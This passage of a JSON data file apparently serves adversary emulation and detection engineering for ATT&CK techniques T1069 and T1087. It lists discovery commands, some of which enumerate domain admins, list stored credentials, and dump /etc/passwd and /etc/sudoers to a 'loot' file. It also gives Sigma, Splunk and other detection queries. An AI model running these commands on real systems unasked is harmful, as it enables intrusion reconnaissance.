Emulation Field Manual": {"Category": "T1069", "Built-in Windows Command": "net group [\"Domain Admins\"] /domain[:DOMAIN] ", "Cobalt Strike": "net group [\"Domain Admins\"] /domain", "Description": "Display the list of domain administrator accounts", "Metasploit": "domain_list_gen.rb\npost/windows/gather/enum_domain_group_users"}}, {"Atomic Red Team Test - Permission Groups Discovery": {"display_name": "Permission Groups Discovery", "atomic_tests": [{"description": "Permission Groups Discovery\n", "supported_platforms": ["macos", "linux"], "name": "Permission Groups Discovery", "executor": {"command": "dscacheutil -q group\ndscl . -list /Groups\ngroups\n", "name": "sh"}}, {"description": "Basic Permission Groups Discovery for Windows\n", "supported_platforms": ["windows"], "name": "Basic Permission Groups Discovery Windows", "executor": {"elevation_required": false, "command": "net localgroup\nnet group /domain\nnet group \"domain admins\" /domain\n", "name": "command_prompt"}}, {"description": "Permission Groups Discovery utilizing PowerShell\n", "supported_platforms": ["windows"], "name": "Permission Groups Discovery PowerShell", "input_arguments": {"user": {"default": "administrator", "type": "string", "description": "User to identify what groups a user is a member of"}}, "executor": {"elevation_required": false, "command": "get-localgroup\nget-ADPrincipalGroupMembership #{user} | select name\n", "name": "powershell"}}, {"description": "Runs \"net group\" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups\n", "supported_platforms": ["windows"], "name": "Elevated group enumeration using net group", "executor": {"elevation_required": false, "command": "net group /domai \"Domain Admins\"\nnet groups \"Account Operators\" /doma\nnet groups \"Exchange Organization Management\" /doma\nnet group \"BUILTIN\\Backup Operators\" /doma\n", "name": "command_prompt"}}], "attack_technique": "T1069"}}, {"Mitre Stockpile - Summary of permission and security groups": {"platforms": {"windows": {"psh": {"command": "gpresult /R\n"}}, "darwin": {"sh": {"command": "groups"}}, "linux": {"sh": {"command": "groups"}}}, "description": "Summary of permission and security groups", "tactic": "discovery", "technique": {"attack_id": "T1069", "name": "Permission Groups Discovery"}, "id": "5c4dd985-89e3-4590-9b57-71fed66ff4e2", "name": "Permission Groups Discovery"}}, {"Mitre Stockpile - Identify all local users": {"platforms": {"windows": {"psh": {"command": "Get-WmiObject -Class Win32_UserAccount\n"}}, "darwin": {"sh": {"command": "dscl . list /Users | grep -v '_'\n"}}}, "description": "Identify all local users", "tactic": "discovery", "technique": {"attack_id": "T1069", "name": "Permission Groups Discovery"}, "id": "feaced8f-f43f-452a-9500-a5219488abb8", "name": "Identify local users"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1069", "Empire Module": "powershell/situational_awareness/host/get_pathacl", "Technique": "Permission Groups Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/get_pathacl\":  [\"T1069\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1069", "Empire Module": "powershell/situational_awareness/network/powerview/get_object_acl", "Technique": "Permission Groups Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_object_acl\":  [\"T1069\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1069", "Empire Module": "powershell/situational_awareness/network/powerview/map_domain_trust", "Technique": "Permission Groups Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/map_domain_trust\":  [\"T1069\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1069", "Empire Module": "powershell/situational_awareness/host/get_uaclevel", "Technique": "Permission Groups Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/get_uaclevel\":  [\"T1069\"],"}}], "queries": [{"query": "Sysmon| where process_path contains \"net\"and (file_directory contains \"user\"or file_directory contains \"group\"or file_directory contains \"localgroup\")", "product": "Azure Sentinel", "name": "Permission Groups Discovery"}, {"query": "Sysmon| where EventID == 1 and process_path contains \"net.exe\"and (process_command_line contains \"*net* user*\"or process_command_line contains \"*net* group*\"or process_command_line contains \"*net* localgroup*\"or process_command_line contains \"*get-localgroup*\"or process_command_line contains \"*get-ADPrinicipalGroupMembership*\")", "product": "Azure Sentinel", "name": "Permission Groups Discovery Process"}, {"query": "title: Reconnaissance Activity\nid: 968eef52-9cff-4454-8992-1e74b9cbad6c\nstatus: experimental\ndescription: Detects activity as \"net user administrator /domain\" and \"net group domain admins /domain\"\nreferences:\n    - https://findingbad.blogspot.de/2017/01/hunting-what-does-it-look-like.html\nauthor: Florian Roth (rule), Jack Croock (method)\ntags:\n    - attack.discovery\n    - attack.t1087\n    - attack.t1069\n    - attack.s0039\nlogsource:\n    product: windows\n    service: security\n    definition: The volume of Event ID 4661 is high on Domain Controllers and therefore \"Audit SAM\" and \"Audit Kernel Object\" advanced audit policy settings are not configured in the recommendations for server systems\ndetection:\n    selection:\n        - EventID: 4661\n          ObjectType: 'SAM_USER'\n          ObjectName: 'S-1-5-21-*-500'\n          AccessMask: '0x2d'\n        - EventID: 4661\n          ObjectType: 'SAM_GROUP'\n          ObjectName: 'S-1-5-21-*-512'\n          AccessMask: '0x2d'\n    condition: selection\nfalsepositives:\n    - Administrator activity\n    - Penetration tests\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Reconnaissance Activity\nid: 968eef52-9cff-4454-8992-1e74b9cbad6c\nstatus: experimental\ndescription: Detects activity as \"net user administrator /domain\" and \"net group domain admins /domain\"\nreferences:\n    - https://findingbad.blogspot.de/2017/01/hunting-what-does-it-look-like.html\nauthor: Florian Roth (rule), Jack Croock (method)\ntags:\n    - attack.discovery\n    - attack.t1087\n    - attack.t1069\n    - attack.s0039\nlogsource:\n    product: windows\n    service: security\n    definition: The volume of Event ID 4661 is high on Domain Controllers and therefore \"Audit SAM\" and \"Audit Kernel Object\" advanced audit policy settings are not configured in the recommendations for server systems\ndetection:\n    selection:\n        - EventID: 4661\n          ObjectType: 'SAM_USER'\n          ObjectName: 'S-1-5-21-*-500'\n          AccessMask: '0x2d'\n        - EventID: 4661\n          ObjectType: 'SAM_GROUP'\n          ObjectName: 'S-1-5-21-*-512'\n          AccessMask: '0x2d'\n    condition: selection\nfalsepositives:\n    - Administrator activity\n    - Penetration tests\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4661\" AND AccessMask:\"0x2d\" AND ((ObjectType:\"SAM_USER\" AND ObjectName.keyword:S\\\\-1\\\\-5\\\\-21\\\\-*\\\\-500) OR (ObjectType:\"SAM_GROUP\" AND ObjectName.keyword:S\\\\-1\\\\-5\\\\-21\\\\-*\\\\-512)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Reconnaissance-Activity <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Reconnaissance Activity\",\\n    \"description\": \"Detects activity as \\\\\"net user administrator /domain\\\\\" and \\\\\"net group domain admins /domain\\\\\"\",\\n    \"tags\": [\\n      \"attack.discovery\",\\n      \"attack.t1087\",\\n      \"attack.t1069\",\\n      \"attack.s0039\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4661\\\\\" AND AccessMask:\\\\\"0x2d\\\\\" AND ((ObjectType:\\\\\"SAM_USER\\\\\" AND ObjectName.keyword:S\\\\\\\\-1\\\\\\\\-5\\\\\\\\-21\\\\\\\\-*\\\\\\\\-500) OR (ObjectType:\\\\\"SAM_GROUP\\\\\" AND ObjectName.keyword:S\\\\\\\\-1\\\\\\\\-5\\\\\\\\-21\\\\\\\\-*\\\\\\\\-512)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4661\\\\\" AND AccessMask:\\\\\"0x2d\\\\\" AND ((ObjectType:\\\\\"SAM_USER\\\\\" AND ObjectName.keyword:S\\\\\\\\-1\\\\\\\\-5\\\\\\\\-21\\\\\\\\-*\\\\\\\\-500) OR (ObjectType:\\\\\"SAM_GROUP\\\\\" AND ObjectName.keyword:S\\\\\\\\-1\\\\\\\\-5\\\\\\\\-21\\\\\\\\-*\\\\\\\\-512)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Reconnaissance Activity\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4661\" AND AccessMask:\"0x2d\" AND ((ObjectType:\"SAM_USER\" AND ObjectName.keyword:S\\\\-1\\\\-5\\\\-21\\\\-*\\\\-500) OR (ObjectType:\"SAM_GROUP\" AND ObjectName.keyword:S\\\\-1\\\\-5\\\\-21\\\\-*\\\\-512)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4661\" AccessMask=\"0x2d\" ((ObjectType=\"SAM_USER\" ObjectName=\"S-1-5-21-*-500\") OR (ObjectType=\"SAM_GROUP\" ObjectName=\"S-1-5-21-*-512\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4661\" AccessMask=\"0x2d\" ((ObjectType=\"SAM_USER\" ObjectName=\"S-1-5-21-*-500\") OR (ObjectType=\"SAM_GROUP\" ObjectName=\"S-1-5-21-*-512\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4661)(?=.*0x2d)(?=.*(?:.*(?:.*(?:.*(?=.*SAM_USER)(?=.*S-1-5-21-.*-500))|.*(?:.*(?=.*SAM_GROUP)(?=.*S-1-5-21-.*-512))))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net user [username] [/domain]", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell net user [username] [/domain]", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "post/windows/gather/enum_ad_users\nauxiliary/scanner/smb/smb_enumusers", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "dsquery group \"ou=Domain Admins,dc=domain,dc=com\"\ndsquery user \"dc=domain,dc=com\"\ndsquery * OU=\"Domain Admins\",DC=domain,DC=com -scope base -attr SAMAccountName userPrincipalName Description\ndsquery * -filter \"(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))\" -Attr samAccountName mail -Limit 0\ndsquery * -filter \"(&(objectCategory=group)(name=*Admin*))\" -Attr name description members", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell dsquery group \"out=Domain Admins\",dc=domain,dc=com\"\nshell dsquery user \"dc=domain,dc=com\"\nshell dsquery * OU=\"Domain Admins\",dc=domain,dc=com -scope base -attr SAMAccountName userPrincipleName Description\nshell dsquery * -filter \"(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))\" -Attr samAccountName mail -Limit 0\nshell dsquery * -filter \"(&(objectCategory=group)(name=*Admin*))\" -Attr name description members", "name": "Cobalt Strike"}, {"source": "atomics/T1087/T1087.yaml", "command": "cat /etc/passwd > ~/loot.txt\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "cat /etc/sudoers > ~/loot.txt\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "grep 'x:0:' /etc/passwd > ~/loot.txt\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "username=$(echo $HOME | awk -F'/' '{print $3}') && lsof -u $username\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "lastlog > ~/loot.txt\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "groups\nid\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "dscl . list /Groups\ndscl . list /Users\ndscl . list /Users | grep -v '_'\ndscacheutil -q group\ndscacheutil -q user\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "net user\nnet user /domain\ndir c:\\Users\\\ncmdkey.exe /list\nnet localgroup \"Users\"\nnet localgroup\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "net user\nnet user /domain\nget-localuser\nget-localgroupmember -group Users\ncmdkey.exe /list\nls C:/Users\nget-childitem C:\\Users\\\ndir C:\\Users\\\nget-aduser -filter *\nget-localgroup\nnet localgroup\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "query user\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "query user\n", "name": null}, {"source": "data/abilities/discovery/364ea817-bbb9-4083-87dd-94b9dba45f6f.yml", "command": {"windows": {"cmd": {"command": "net user #{domain.user.name} /domain\n"}}}, "name": "The net utility is executed via cmd to enumerate detailed information about a specific user account."}, {"source": "data/abilities/discovery/c1cd6388-3ced-48c7-a511-0434c6ba8f48.yml", "command": {"darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}, "command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n"}}, "linux": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}, "command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n"}}}, "name": "Get a list of all local users"}, {"source": "data/abilities/discovery/c7ec57cd-933e-42b6-99a4-e852a9e57a33.yml", "command": {"windows": {"cmd": {"command": "net user /domain"}}}, "name": "The net utility is executed via cmd to enumerate domain user accounts."}, {"source": "Threat Hunting Tables", "command": "Net.exe localgroup \"administrators\"", "name": null}, {"source": "Threat Hunting Tables", "command": "Net.exe group \"domain admins\" /domain", "name": null}, {"source": "Threat Hunting Tables", "command": "Net.exe user * /domain", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe useraccount get /ALL", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe useraccount list", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe qfe get description,installedOn /format:csv", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe process get caption,executablepath,commandline", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe service get name,displayname,pathname,startmode", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe share list", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe /node:\"192.168.0.1\" service where (caption like \"%sql server (%\")", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe get-wmiobject -class \"win32_share\" -namespace \"root\\CIMV2\" -computer \"targetname\"", "name": null}, {"source": "Threat Hunting Tables", "command": "nltest.exe", "name": "parent_process"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/get_domain_sid", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/get_domain_sid", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/sid_to_user", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/sid_to_user", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/user_to_sid", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/user_to_sid", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/get_spn", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/get_spn", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_foreign_group", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_foreign_group", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_foreign_user", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_foreign_user", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_gpo_computer_admin", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_gpo_computer_admin", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_gpo_location", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_gpo_location", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_localadmin_access", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_localadmin_access", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_managed_security_group", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_managed_security_group", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_gpo_computer", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_gpo_computer", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_group", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_group", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_group_member", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_group_member", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_localgroup", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_localgroup", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_loggedon", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_loggedon", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_ou", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_ou", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_user", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_user", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/user_hunter", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/user_hunter", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/dscl_get_groupmembers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/dscl_get_groupmembers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/dscl_get_groups", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/dscl_get_groups", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/dscl_get_users", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/dscl_get_users", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_groupmembers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_groupmembers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_groupmemberships", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_groupmemberships", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_groups", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_groups", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_ous", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_ous", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_userinformation", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_userinformation", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_users", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_users", "name": "Empire Module Command"}, {"source": "Kirtar22/Litmus_Test", "command": "Atomic Test #1 - Enumerate all accounts", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "cat /etc/passwd > #{output_file}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "Atomic Test #2 - View sudoers access", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "cat /etc/sudoers > #{output_file}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "Atomic Test #3 - View accounts with UID 0", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "username=$(echo $HOME | awk -F'/' '{print $3}') && lsof -u $username", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "lsof $USER", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "Atomic Test #4 - Show if a user account has ever logger in remotely", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "lastlog > #{output_file}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "Atomic Test #5 - Enumerate users and groups", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "groups", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "id", "name": null}], "command_list": ["net user [username] [/domain]", "shell net user [username] [/domain]", "post/windows/gather/enum_ad_users\nauxiliary/scanner/smb/smb_enumusers", "dsquery group \"ou=Domain Admins,dc=domain,dc=com\"\ndsquery user \"dc=domain,dc=com\"\ndsquery * OU=\"Domain Admins\",DC=domain,DC=com -scope base -attr SAMAccountName userPrincipalName Description\ndsquery * -filter \"(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))\" -Attr samAccountName mail -Limit 0\ndsquery * -filter \"(&(objectCategory=group)(name=*Admin*))\" -Attr name description members", "shell dsquery group \"out=Domain Admins\",dc=domain,dc=com\"\nshell dsquery user \"dc=domain,dc=com\"\nshell dsquery * OU=\"Domain Admins\",dc=domain,dc=com -scope base -attr SAMAccountName userPrincipleName Description\nshell dsquery * -filter \"(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))\" -Attr samAccountName mail -Limit 0\nshell dsquery * -filter \"(&(objectCategory=group)(name=*Admin*))\" -Attr name description members", "cat /etc/passwd > ~/loot.txt\n", "cat /etc/sudoers > ~/loot.txt\n", "grep 'x:0:' /etc/passwd > ~/loot.txt\n", "username=$(echo $HOME | awk -F'/' '{print $3}') && lsof -u $username\n", "lastlog > ~/loot.txt\n", "groups\nid\n", "dscl . list /Groups\ndscl . list /Users\ndscl . list /Users | grep -v '_'\ndscacheutil -q group\ndscacheutil -q user\n", "net user\nnet user /domain\ndir c:\\Users\\\ncmdkey.exe /list\nnet localgroup \"Users\"\nnet localgroup\n", "net user\nnet user /domain\nget-localuser\nget-localgroupmember -group Users\ncmdkey.exe /list\nls C:/Users\nget-childitem C:\\Users\\\ndir C:\\Users\\\nget-aduser -filter *\nget-localgroup\nnet localgroup\n", "query user\n", "query user\n", {"windows": {"cmd": {"command": "net user #{domain.user.name} /domain\n"}}}, {"darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}, "command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n"}}, "linux": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}, "command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n"}}}, {"windows": {"cmd": {"command": "net user /domain"}}}, "Net.exe localgroup \"administrators\"", "Net.exe group \"domain admins\" /domain", "Net.exe user * /domain", "wmic.exe useraccount get /ALL", "wmic.exe useraccount list", "wmic.exe qfe get description,installedOn /format:csv", "wmic.exe process get caption,executablepath,commandline", "wmic.exe service get name,displayname,pathname,startmode", "wmic.exe share list", "wmic.exe /node:\"192.168.0.1\" service where (caption like \"%sql server (%\")", "wmic.exe get-wmiobject -class \"win32_share\" -namespace \"root\\CIMV2\" -computer \"targetname\"", "nltest.exe", "powershell/management/get_domain_sid", "powershell/management/get_domain_sid", "powershell/management/sid_to_user", "powershell/management/sid_to_user", "powershell/management/user_to_sid", "powershell/management/user_to_sid", "powershell/situational_awareness/network/get_spn", "powershell/situational_awareness/network/get_spn", "powershell/situational_awareness/network/powerview/find_foreign_group", "powershell/situational_awareness/network/powerview/find_foreign_group", "powershell/situational_awareness/network/powerview/find_foreign_user", "powershell/situational_awareness/network/powerview/find_foreign_user", "powershell/situational_awareness/network/powerview/find_gpo_computer_admin", "powershell/situational_awareness/network/powerview/find_gpo_computer_admin", "powershell/situational_awareness/network/powerview/find_gpo_location", "powershell/situational_awareness/network/powerview/find_gpo_location", "powershell/situational_awareness/network/powerview/find_localadmin_access", "powershell/situational_awareness/network/powerview/find_localadmin_access", "powershell/situational_awareness/network/powerview/find_managed_security_group", "powershell/situational_awareness/network/powerview/find_managed_security_group", 